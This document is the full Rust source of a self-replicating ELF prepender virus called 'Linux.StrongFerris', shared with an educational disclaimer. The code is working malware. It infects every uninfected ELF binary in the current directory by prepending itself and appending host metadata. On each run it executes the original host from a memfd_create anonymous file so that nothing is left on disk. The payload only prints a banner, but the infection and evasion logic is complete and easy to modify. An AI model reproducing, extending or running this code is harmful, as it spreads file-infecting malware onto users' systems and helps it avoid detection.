//! Linux.StrongFerris is a simple ELF prepender virus by Kyo (2021)
//! StrongFerris because Ferris is a small crab but it can carry large 
//! binaries on its back! 
//! 
//! This prepender implements two improvements over Linux.FerrisFirst:
//! 
//! Firstly, metadata such as the host size is included when a binary is 
//! infected, removing the need for a VIRUS_SIZE constant and two-step
//! compilation. 
//! 
//! Secondly, this version makes use of the memfd_create(2) Linux system call
//! to create an anonymous file when running the host code, which is not stored
//! and therefore cannot be discovered later on the /dev/shm filesystem.
//!
//! The code is shared in the spirit of free information. I hope this helps 
//! others understand how ELF prependers work and some of the techniques they 
//! may encounter. 
//!
//! The included payload is non-destructive and the spreading is limited to 
//! the current working directory. I am not responsible for how you may 
//! modify and/or apply this code. 
//!
//! Don't be stupid.
use std::{env, fs, mem};
use std::process::Command;

const ELF_MAGIC: &[u8; 4] = b"\x7fELF";
const VIRUS_MAGIC: &[u8; 8] = b"tmp.out\0";
const HOST_META_SIZE: usize = 16;

extern "C" {
    fn memfd_create(name: *const u8, flags: u32) -> i32;
}

#[repr(C)]
#[derive(Debug)]
struct HostMeta {
    host_size: usize,
    magic: [u8; 8],
}

impl HostMeta {
    fn new(host_size: usize) -> HostMeta {
        HostMeta { host_size, magic: *VIRUS_MAGIC }
    }

    fn serialize(self) -> [u8; HOST_META_SIZE] {
        unsafe { mem::transmute(self) }
    }
}

fn is_elf(bytes: &[u8]) -> bool {
    &bytes[..4] == ELF_MAGIC
}

fn is_infected(bytes: &[u8]) -> bool {
    let mut cur = 0;
    for &byte in bytes {
        if byte == VIRUS_MAGIC[cur] {
            cur += 1;
        } else {
            cur = 0;
        }
        if cur == VIRUS_MAGIC.len() {
            return true;
        }
    }

    false
}

/// Parse host metadata if present
fn parse_meta(bytes: &[u8]) -> Option<HostMeta> {
    // Copy last 16 bytes of `bytes` to an array to transmute
    let mut copy: [u8; 16] = [0; 16];
    for i in 0..16 {
        let j = (bytes.len() - 16) + i;
        copy[i] = bytes[j];
    }

    // Check the metadata is valid before returning
    let meta: HostMeta = unsafe { mem::transmute(copy) };
    if &meta.magic == VIRUS_MAGIC {
        return Some(meta)
    }

    None
}

fn spread_and_infect(dir: &str, virus: &[u8]) {
    let entries: Vec<fs::DirEntry> = match fs::read_dir(dir) {
        Ok(v) => v.filter_map(Result::ok).collect(), // Discard `Err`s
        Err(_) => return,
    };

    for entry in entries {
        let contents = match fs::read(entry.path()) {
            Ok(v) => v,
            Err(_) => continue,
        };

        // Skip if this is not an ELF file
        if !is_elf(&contents) { continue; }

        // Skip if this file is already infected
        if is_infected(&contents) { continue; }

        // Infect this file ignoring errors
        let mut new_file: Vec<u8> = vec![];
        let meta = HostMeta::new(contents.len());
        new_file.extend_from_slice(&virus);
        new_file.extend_from_slice(&contents);
        new_file.extend_from_slice(&meta.serialize());

        let _ = fs::write(entry.path(), &new_file);
    }
}

fn extract_and_run(args: &[String], host: &[u8]) {
    let raw_fd = unsafe { memfd_create(b"\0".as_ptr(), 0) };
    let path = format!("/proc/self/fd/{}", raw_fd);

    if fs::write(&path, &host).is_err() { return };
    if Command::new(&path).args(args).status().is_err() { return; }
}

fn virus_main() {
    println!("\x1b[92m.: tmp.out :.\x1b[0m");
}

fn main() {
    let mut args: Vec<String> = env::args().collect();
    let my_name = args.remove(0);

    let my_bytes = match fs::read(my_name) {
        Ok(v) => v.to_vec(),
        Err(_) => return,
    };
    
    if let Some(meta) = parse_meta(&my_bytes) {
        // HostMeta was found: this is an infected binary
        let meta_offset = my_bytes.len() - HOST_META_SIZE;
        let host_offset = meta_offset - meta.host_size;

        let virus = &my_bytes[..host_offset];
        let host = &my_bytes[host_offset..meta_offset];

        virus_main();
        spread_and_infect(".", &virus);
        extract_and_run(&args, &host);
    } else {
        // There was no HostMeta: this is the original infector
        spread_and_infect(".", &my_bytes);
    }
}